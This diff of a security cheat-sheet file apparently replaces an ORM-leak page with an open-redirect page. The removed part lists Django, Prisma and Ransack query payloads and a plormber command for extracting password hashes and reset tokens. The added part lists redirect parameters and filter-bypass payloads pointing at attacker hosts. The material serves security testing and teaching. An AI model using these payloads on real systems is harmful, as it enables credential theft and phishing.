@@ -1,235 +1,185 @@
-# ORM Leak
+# Open URL Redirect
 
-> An ORM leak vulnerability occurs when sensitive information, such as database structure or user data, is unintentionally exposed due to improper handling of ORM queries. This can happen if the application returns raw error messages, debug information, or allows attackers to manipulate queries in ways that reveal underlying data.
+> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
 
 ## Summary
 
-* [Django (Python)](#django-python)
-    * [Query filter](#query-filter)
-    * [Relational Filtering](#relational-filtering)
-        * [One-to-One](#one-to-one)
-        * [Many-to-Many](#many-to-many)
-    * [Error-based leaking - ReDOS](#error-based-leaking---redos)
-* [Prisma (Node.JS)](#prisma-nodejs)
-    * [Relational Filtering](#relational-filtering-1)
-        * [One-to-One](#one-to-one-1)
-        * [Many-to-Many](#many-to-many-1)
-* [Ransack (Ruby)](#ransack-ruby)
-* [CVE](#cve)
+* [Methodology](#methodology)
+    * [HTTP Redirection Status Code](#http-redirection-status-code)
+    * [Redirect Methods](#redirect-methods)
+        * [Path-based Redirects](#path-based-redirects)
+        * [JavaScript-based Redirects](#javascript-based-redirects)
+        * [Common Query Parameters](#common-query-parameters)
+    * [Filter Bypass](#filter-bypass)
+* [Labs](#labs)
 * [References](#references)
 
-## Django (Python)
+## Methodology
 
-The following code is a basic example of an ORM querying the database.
+An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.
 
-```py
-users = User.objects.filter(**request.data)
-serializer = UserSerializer(users, many=True)
+Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.
+
+**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
+
+```ps1
+https://example.com/redirect?url=https://userpreferredsite.com
 ```
 
-The problem lies in how the Django ORM uses keyword parameter syntax to build QuerySets. By utilizing the unpack operator (`**`), users can dynamically control the keyword arguments passed to the filter method, allowing them to filter results according to their needs.
+An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.
 
-### Query filter
+## HTTP Redirection Status Code
 
-The attacker can control the column to filter results by.
-The ORM provides operators for matching parts of a value. These operators can utilize the SQL LIKE condition in generated queries, perform regex matching based on user-controlled patterns, or apply comparison operators such as < and >.
+HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:
 
-```json
-{
-  "username": "admin",
-  "password__startswith": "p"
-}
-```
+* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
+* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
+* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
+* [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
+* [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
+* [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header.
+* [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
+* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.
 
-Interesting filter to use:
+## Redirect Methods
 
-* `__startswith`
-* `__contains`
-* `__regex`
+### Path-based Redirects
 
-### Relational Filtering
+Instead of query parameters, redirection logic may rely on the path:
 
-Let's use this great example from [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)
+* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
+* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`
 
-![UML-example-app-simplified-highlight](https://cdn.prod.website-files.com/6971f0e051b588235e8acf7b/69c28ab386b7948b108ecc8b_69b98986947782073459457e_UML-example-app-simplified-highlight1.avif)
+### JavaScript-based Redirects
 
-We can see 2 type of relationships:
-
-* One-to-One relationships
-* Many-to-Many Relationships
-
-#### One-to-One
-
-Filtering through user that created an article, and having a password containing the character `p`.
-
-```json
-{
-  "created_by__user__password__contains": "p"
-}
-```
-
-#### Many-to-Many
-
-Almost the same thing but you need to filter more.
-
-* Get the user IDS: `created_by__departments__employees__user__id`
-* For each ID, get the username: `created_by__departments__employees__user__username`
-* Finally, leak their password hash: `created_by__departments__employees__user__password`
-
-Use multiple filters in the same request:
-
-```json
-{
-  "created_by__departments__employees__user__username__startswith": "p",
-  "created_by__departments__employees__user__id": 1
-}
-```
-
-### Error-based leaking - ReDOS
-
-If Django use MySQL, you can also abuse a ReDOS to force an error when the filter does not properly match the condition.
-
-```json
-{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
-// => Return something
-
-{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
-// => Error 500 (Timeout exceeded in regular expression match)
-```
-
-## Prisma (Node.JS)
-
-**Tools**:
-
-* [elttam/plormber](https://github.com/elttam/plormber) - tool for exploiting ORM Leak time-based vulnerabilities
-
-    ```ps1
-    plormber prisma-contains \
-        --chars '0123456789abcdef' \
-        --base-query-json '{"query": {PAYLOAD}}' \
-        --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
-        --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
-        --verbose-stats \
-        https://some.vuln.app/articles/time-based;
-    ```
+If the application uses JavaScript for redirects, attackers may manipulate script variables:
 
 **Example**:
 
-Example of an ORM leak in Node.JS with Prisma.
-
 ```js
-const posts = await prisma.article.findMany({
-  where: req.query.filter as any // Vulnerable to ORM Leaks
-})
+var redirectTo = "http://trusted.com";
+window.location = redirectTo;
 ```
 
-Use the include to return all the fields of user records that have created an article
+**Payload**: `?redirectTo=http://malicious.com`
 
-```json
-{
-  "filter": {
-    "include": {
-      "createdBy": true
-    }
-  }
-}
+### Common Query Parameters
+
+```powershell
+?checkout_url={payload}
+?continue={payload}
+?dest={payload}
+?destination={payload}
+?go={payload}
+?image_url={payload}
+?next={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+?return_path={payload}
+?return_to={payload}
+?return={payload}
+?returnTo={payload}
+?rurl={payload}
+?target={payload}
+?url={payload}
+?view={payload}
+/{payload}
+/redirect/{payload}
 ```
 
-Select only one field
+## Filter Bypass
 
-```json
-{
-  "filter": {
-    "select": {
-      "createdBy": {
-        "select": {
-          "password": true
-        }
-      }
-    }
-  }
-}
-```
+* Using a whitelisted domain or keyword
 
-### Relational Filtering
-
-#### One-to-One
-
-* [`filter[createdBy][resetToken][startsWith]=06`](http://127.0.0.1:9900/articles?filter[createdBy][resetToken][startsWith]=)
-
-#### Many-to-Many
-
-```json
-{
-  "query": {
-    "createdBy": {
-      "departments": {
-        "some": {
-          "employees": {
-            "some": {
-              "departments": {
-                "some": {
-                  "employees": {
-                    "some": {
-                      "departments": {
-                        "some": {
-                          "employees": {
-                            "some": {
-                              "{fieldToLeak}": {
-                                "startsWith": "{testStartsWith}"
-                              }
-                            }
-                          }
-                        }
-                      }
-                    }
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
-
-## Ransack (Ruby)
-
-Only in Ransack < `4.0.0`.
-
-![ransack_bruteforce_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)
-
-* Extracting the `reset_password_token` field of a user
-
-    ```ps1
-    GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=2 -> Results in page
-
-    GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=2f -> Results in page
+    ```powershell
+    www.whitelisted.com.evil.com redirect to evil.com
     ```
 
-* Target a specific user and extract his `recoveries_key`
+* Using **CRLF** to bypass "javascript" blacklisted keyword
 
-    ```ps1
-    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
+    ```powershell
+    java%0d%0ascript%0d%0a:alert(0)
     ```
 
-## CVE
+* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
 
-* [CVE-2023-47117: Label Studio ORM Leak](https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw)
-* [CVE-2023-31133: Ghost CMS ORM Leak](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)
-* [CVE-2023-30843: Payload CMS ORM Leak](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)
+    ```powershell
+    //google.com
+    ////google.com
+    ```
+
+* Using "https:" to bypass "`//`" blacklisted keyword
+
+    ```powershell
+    https:google.com
+    ```
+
+* Using "`\/\/`" to bypass "`//`" blacklisted keyword
+
+    ```powershell
+    \/\/google.com/
+    /\/google.com/
+    ```
+
+* Using "`%E3%80%82`" to bypass "." blacklisted character
+
+    ```powershell
+    /?redir=google。com
+    //google%E3%80%82com
+    ```
+
+* Using null byte "`%00`" to bypass blacklist filter
+
+    ```powershell
+    //google%00.com
+    ```
+
+* Using HTTP Parameter Pollution
+
+    ```powershell
+    ?next=whitelisted.com&next=google.com
+    ```
+
+* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
+
+    ```powershell
+    //<user>:<password>@<host>:<port>/<url-path>
+    http://www.theirsite.com@yoursite.com/
+    ```
+
+* Creating folder as their domain
+
+    ```powershell
+    http://www.yoursite.com/http://www.theirsite.com/
+    http://www.yoursite.com/folder/www.folder.com
+    ```
+
+* Using "`?`" character, browser will translate it to "`/?`"
+
+    ```powershell
+    http://www.yoursite.com?http://www.theirsite.com/
+    http://www.yoursite.com?folder/www.folder.com
+    ```
+
+* Host/Split Unicode Normalization
+
+    ```powershell
+    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+    http://a.com／X.b.com
+    ```
+
+## Labs
+
+* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
+* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
 ## References
 
-* [ORM Injection - HackTricks - July 30, 2024](https://web.archive.org/web/20241230091620/https://book.hacktricks.xyz/pentesting-web/orm-injection)
-* [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://web.archive.org/web/20260118225011/https://pentesterlab.com/blog/orm-leak-with-sqlite3)
-* [ORM Leaking More Than You Joined For - Alex Brown - December 18, 2025](https://web.archive.org/web/20251218130815/https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
-* [plORMbing your Django ORM - Alex Brown - June 24, 2024](https://web.archive.org/web/20240624071414/https://www.elttam.com/blog/plormbing-your-django-orm/)
-* [plORMbing your Prisma ORM with Time-based Attacks - Alex Brown - July 9, 2024](https://web.archive.org/web/20240709043351/https://www.elttam.com/blog/plorming-your-primsa-orm/)
-* [QuerySet API reference - Django - August 8, 2024](https://web.archive.org/web/20240625055642/https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
-* [Ransacking your password reset tokens - Lukas Euler - January 26, 2023](https://web.archive.org/web/20251211204930/https://positive.security/blog/ransack-data-exfiltration)
+* [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://web.archive.org/web/20190819081715/https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
+* [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://web.archive.org/web/20190719012735/https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
+* [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://web.archive.org/web/20180816184136/https://s0cket7.com/open-redirect-vulnerability/)
+* [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
+* [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://web.archive.org/web/20130423163025/https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
+* [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
